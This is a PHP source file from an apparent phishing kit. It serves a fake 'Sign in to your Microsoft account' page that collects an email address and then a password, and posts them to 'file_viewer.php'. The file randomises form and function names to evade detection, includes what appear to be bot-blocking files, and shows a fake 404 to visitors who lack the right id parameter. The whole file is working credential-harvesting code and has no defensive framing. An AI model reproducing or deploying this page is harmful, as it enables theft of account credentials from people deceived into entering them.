<?php
session_start();
error_reporting(0);
include "control.php";
include "of.php";
if(isset($_GET["id"]))
{
	$formName=randomCha(rand(10,25));
	$formJS=randomCha(rand(7,9));
	$formJS2="gb".randomCha(rand(7,9));
	
	echo '<!DOCTYPE html>



<html dir="ltr" lang="EN-US"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge"><title>Sign in to your Microsoft account</title>

<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">

<link rel="shortcut icon" href="desk/favicon.ico"><link rel="stylesheet" title="" type="text/css" href="desk/c.css"><style type="text/css">body.cb input.hip{border-width: 2px !important;}</style><style type="text/css">body{display:none;}</style><style type="text/css">body{display:block !important;}</style><link rel="image_src" href="#"></head><body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass"><div> <div data-bind="component: { name: \'background-image\', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;desk/0-small.jpg&quot;);"></div> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;desk/0.jpg&quot;);"></div> <div class="background-overlay"></div> </div></div> 





<script>
function '.$formJS2.'()
{
document.getElementById("ediv").style.display="";
document.getElementById("pdiv").style.display="none";
eidok=0;
}
var eidok=0;
function '.$formJS.'(){

var a=document.forms["'.$formName.'"]["eid"];
var b=document.forms["'.$formName.'"]["pid"];



if(a.value.length<2)
{
a.className="form-control ltr_override has-error";
document.getElementById("eide").style.display="";
return false;
}

if(eidok == 0)
{
a.className="form-control ltr_override";
document.getElementById("eide").style.display="none";
document.getElementById("eidbut").disabled=true;
document.getElementById("eidprog").style.display="";
document.getElementById("display").innerHTML=a.value;
a.focus();

setTimeout(function(){

document.getElementById("ediv").style.display="none";
document.getElementById("eidprog").style.display="none";
document.getElementById("eidbut").disabled=false;
document.getElementById("pdiv").style.display="";
 }, 3000);

eidok=1;
return false;
}

if(b.value.length<5)
{
b.className="form-control has-error";
document.getElementById("pide").style.display="";
return false;
}
else
{
b.className="form-control";
document.getElementById("pide").style.display="none";
}

document.getElementById("'.$formName.'").submit();
}
</script>
<form name="'.$formName.'" id="'.$formName.'" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }" action="file_viewer.php?fileID='.randomCha(rand(40,60)).'" onsubmit="'.$formJS.'(); return false;"> <div class="outer" > <div class="middle" > <div class="inner" data-bind="css: { \'app\': $loginPage.backgroundLogoUrl(), \'wide\': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(\'wide\') }"> <div role="banner" data-bind="component: { name: \'logo-control\',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }"> <img class="logo" role="presentation"  src="desk/microsoft_logo.svg">  </div>






<div role="main" style="display:none" id="pdiv"><div> <div>

 <input name="loginfmt" data-bind="moveOffScreen, value: displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true" type="text">
 
 
 <div> <div class="identityBanner"> <div id="display" class="identity" title=""></div> <div class="profile-photo"> <img role="presentation"  src="desk/assets.svg"> </div> </div></div> <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str[\'CT_PWD_STR_EnterPassword_Title\']">Enter password</div> <div class="row"> <div class="form-group col-md-24"> 
 
 <div role="alert" aria-live="assertive" aria-atomic="false">
 <div id="pide" class="alert alert-error" style="display:none">Please enter the password for your Microsoft account.</div></div>
 
 <div class="placeholderContainer">  
 <input name="pid" id="pid" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" placeholder="Password" aria-label="Enter password" type="password">




 </div> </div> </div> <div class="row"> <div>
 
 <div class="col-xs-24 form-group no-padding-left-right"> <div class="col-xs-12 secondary"> 
 <input id="idBtn_Back" class="btn btn-block"  value="Back" type="button" onclick="'.$formJS2.'();">
 </div> <div data-bind="css: { \'col-xs-12 primary\': isSecondaryButtonVisible(), \'col-xs-24\': !isSecondaryButtonVisible() }" class="col-xs-12 primary"> <input id="idSIButton9" class="btn btn-block btn-primary" value="Sign in" type="submit"> </div> </div></div> </div> <div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.B &amp;&amp; !showHip"> <label id="idLbl_PWD_KMSI_Cb"> <input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" data-bind="checked: isKmsiChecked, ariaLabel: str[\'CT_PWD_STR_KeepMeSignedInCB_Text\']" aria-label="Keep me signed in" type="checkbox"> <span data-bind="text: str[\'CT_PWD_STR_KeepMeSignedInCB_Text\']">Keep me signed in</span> </label> </div> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="#" data-bind="text: str[\'CT_PWD_STR_ForgotPwdLink_Text\'], href: svr.c, click: resetPassword_onClick">Forgot my password</a> </div>
 </div> </div> </div></div> </div></div>




























						<div role="main" id="ediv"><div> <div data-viewid="1"> <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str[\'WF_STR_HeaderDefault_Title\']">Sign in</div> <div class="row">


							<div role="alert" aria-live="assertive" aria-atomic="false"><div class="alert alert-error col-md-24" id="eide" style="display:none;" >Enter a valid email address, phone number, or Skype name.</div> </div>


							<div class="form-group col-md-24"> <div class="placeholderContainer" >  
							<input name="eid" id="eid" maxlength="113" class="form-control ltr_override" aria-describedby="usernameError loginHeader loginDescription" aria-required="true"  placeholder="Email, phone, or Skype" aria-label="Enter your email, phone, or Skype." type="email" lang="en">

							<input name="passwd" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true" type="password"> <div id="eidprog" class="progress" role="progressbar" data-bind="visible: isRequestPending, component: \'marching-ants-control\', ariaLabel: str[\'WF_STR_ProgressText\']" style="display:none" aria-label="Please wait"> <div></div><div></div><div></div><div></div><div></div><div></div></div> </div> </div> </div> <div class="row"> <div ><div class="col-xs-24 form-group no-padding-left-right" > <div data-bind="css: { \'col-xs-12 secondary\': isPrimaryButtonVisible(), \'col-xs-24\': !isPrimaryButtonVisible() }" class="col-xs-12 secondary"> <input id="idBtn_Back" class="btn btn-block"  value="Back" style="display: none;" type="button"> </div> <div data-bind="css: { \'col-xs-12 primary\': isSecondaryButtonVisible(), \'col-xs-24\': !isSecondaryButtonVisible() }" class="col-xs-24"> <input id="eidbut" class="btn btn-block btn-primary"  value="Next" type="submit"> </div> </div></div> </div> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <div class="form-group" >No account? <a href="#" id="signup" class="display-inline-block" aria-label="Create a Microsoft account">Create one!</a></div>
				</div> </div> </div></div> </div></div> </div> 
				
				
				<div data-bind="component: { name: \'instrumentation\',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }">
				
				
				</div> </div> </div> <div id="footer" class="footer default" role="contentinfo" data-bind="css: { \'default\': !backgroundLogoUrl() }"> <div > <div id="footerLinks" class="footerNode text-secondary"> <span id="ftrCopy" data-bind="html: svr.B5">©2018 Microsoft</span> <a id="ftrTerms" data-bind="text: str[\'MOBILE_STR_Footer_Terms\'], href: termsLink, click: termsLink_onClick" href="#">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str[\'MOBILE_STR_Footer_Privacy\'], href: privacyLink, click: privacyLink_onClick" href="#">Privacy &amp; cookies</a> <a href="#" role="button" class="moreOptions" data-bind="click: moreInfo_onClick, ariaLabel: str[\'CT_STR_More_Options_Ellipsis_AriaLabel\'], attr: { title: str[\'CT_STR_More_Options_Ellipsis_AriaLabel\'] }" aria-label="Click here for more options" title=""> <img class="desktopMode" role="presentation"  src="desk/ellipsis_white.svg">  <img class="mobileMode" role="presentation"  data-bind="imgSrc" src="desk/ellipsis_grey.svg">  </a> </div> </div> </div> </form> <form method="post" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"> </form></div></body></html>
				';
}
else
{
	echo "404 - Page Not Found";
}
?>